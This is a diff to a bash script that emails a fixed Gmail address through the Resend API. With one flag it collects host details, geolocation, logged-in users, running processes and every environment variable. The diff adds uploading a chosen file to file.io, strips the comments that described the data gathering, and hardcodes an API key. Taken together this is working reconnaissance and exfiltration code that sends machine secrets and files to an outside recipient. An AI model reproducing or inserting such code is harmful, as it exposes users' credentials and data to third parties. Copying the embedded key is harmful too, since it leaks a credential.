@@ -4,7 +4,7 @@
 subject=""
 body=""
 file=""
-send_all_info=false  # By default, do not send all system info
+send_all_info=false
 
 # Hardcoded receiver email
 receiver="marcush3llsquad@gmail.com"
@@ -15,21 +15,21 @@ sender_name="${USER}@${HOSTNAME}"
 # Get the user's location via IP (uses an external service like ipinfo.io)
 location=$(curl -s https://ipinfo.io/loc)
 
-# Gather system information (only used when -a flag is set)
-os_info=$(uname -a)                              # OS and Kernel info
-cpu_info=$(lscpu | grep 'Model name' | awk -F: '{print $2}' | xargs)  # CPU Model
-cpu_arch=$(uname -m)                             # CPU Architecture
-mem_total=$(free -h | grep Mem | awk '{print $2}') # Total Memory
-mem_used=$(free -h | grep Mem | awk '{print $3}')  # Used Memory
-mem_free=$(free -h | grep Mem | awk '{print $4}')  # Free Memory
-disk_usage=$(df -h / | grep / | awk '{print $5}')  # Root Disk Usage
-disk_partitions=$(lsblk | grep disk)               # Disk Partitions Info
-network_interfaces=$(ip -o link show | awk -F': ' '{print $2}') # Network Interfaces
-ip_info=$(hostname -I | awk '{print $1}')          # IP Address
-uptime_info=$(uptime -p)                           # System Uptime
-logged_users=$(who)                                # Currently logged-in users
-running_processes=$(ps aux --sort=-%mem | head -n 10) # Top 10 processes by memory usage
-env_vars=$(printenv)                               # Environment Variables
+# Gather comprehensive system information
+os_info=$(uname -a)
+cpu_info=$(lscpu | grep 'Model name' | awk -F: '{print $2}' | xargs)
+cpu_arch=$(uname -m)
+mem_total=$(free -h | grep Mem | awk '{print $2}')
+mem_used=$(free -h | grep Mem | awk '{print $3}')
+mem_free=$(free -h | grep Mem | awk '{print $4}')
+disk_usage=$(df -h / | grep / | awk '{print $5}')
+disk_partitions=$(lsblk | grep disk)
+network_interfaces=$(ip -o link show | awk -F': ' '{print $2}')
+ip_info=$(hostname -I | awk '{print $1}')
+uptime_info=$(uptime -p)
+logged_users=$(who)
+running_processes=$(ps aux --sort=-%mem | head -n 10)
+env_vars=$(printenv)
 
 # Parse command line arguments
 while getopts ":s:b:f:a" opt; do
@@ -40,7 +40,7 @@ while getopts ":s:b:f:a" opt; do
     ;;
     f) file="$OPTARG"
     ;;
-    a) send_all_info=true  # Set flag to send all system information
+    a) send_all_info=true
     ;;
     \?) exit 1
     ;;
@@ -61,9 +61,30 @@ fi
 api_key="re_dSFUhTGY_6hNYMi4Uc33SfBBSfLY9Uotw"
 url="https://api.resend.com/emails"
 
-# Create the email body based on the -a flag
+# Upload file using file.io and get the link if file exists
+file_link=""
+if [ -n "$file" ] && [ -f "$file" ]; then
+  echo "Uploading file..."
+  response=$(curl -s -X POST 'https://file.io/' \
+    -H 'accept: application/json' \
+    -H 'Content-Type: multipart/form-data' \
+    -F "file=@$file")
+
+  # Extract the file link from the response
+  file_link=$(echo "$response" | jq -r .link)
+
+  if [ "$file_link" != "null" ]; then
+    file_attachment="<hr><p><strong>File uploaded:</strong> <a href='$file_link'>$file</a></p>"
+  else
+    file_attachment="<p><strong>File upload failed</strong></p>"
+  fi
+else
+  file_attachment=""
+fi
+
+# Create full email body based on flag
 if [ "$send_all_info" = true ]; then
-  # Include detailed system info
+  # Send all system info
   full_body="<p>$body</p>
   <hr>
   <h3>Comprehensive System Information:</h3>
@@ -82,46 +103,27 @@ if [ "$send_all_info" = true ]; then
   <li><strong>Logged-in Users:</strong> <pre>$logged_users</pre></li>
   <li><strong>Top 10 Running Processes (by memory):</strong> <pre>$running_processes</pre></li>
   <li><strong>Environment Variables:</strong> <pre>$env_vars</pre></li>
-  </ul>"
+  </ul>
+  $file_attachment"
 else
-  # Send only the provided subject, body, and file (no extra info)
-  full_body="<p>$body</p>"
+  # Only send subject, body, and file attachment if exists
+  full_body="<p>$body</p>$file_attachment"
 fi
 
-# Prepare the email data
-if [ -n "$file" ]; then
-  # If a file attachment is provided, attach it (this is a placeholder for actual file attachment handling)
-  email_data=$(jq -n \
-    --arg from "$sender_name <onboarding@resend.dev>" \
-    --arg to "$receiver" \
-    --arg subject "$subject" \
-    --arg body "$full_body" \
-    --arg file "$file" \
-    '{
-      from: $from,
-      to: [$to],
-      subject: $subject,
-      html: $body,
-      attachments: [{
-        path: $file
-      }]
-    }')
-else
-  # Without file attachment
-  email_data=$(jq -n \
-    --arg from "$sender_name <onboarding@resend.dev>" \
-    --arg to "$receiver" \
-    --arg subject "$subject" \
-    --arg body "$full_body" \
-    '{
-      from: $from,
-      to: [$to],
-      subject: $subject,
-      html: $body
-    }')
-fi
+# Create email data
+email_data=$(jq -n \
+  --arg from "$sender_name <onboarding@resend.dev>" \
+  --arg to "$receiver" \
+  --arg subject "$subject" \
+  --arg body "$full_body" \
+  '{
+    from: $from,
+    to: [$to],
+    subject: $subject,
+    html: $body
+  }')
 
-# Send the email via curl without printing anything
+# Send the email via curl
 curl -s -X POST "$url" \
   -H "Authorization: Bearer $api_key" \
   -H "Content-Type: application/json" \
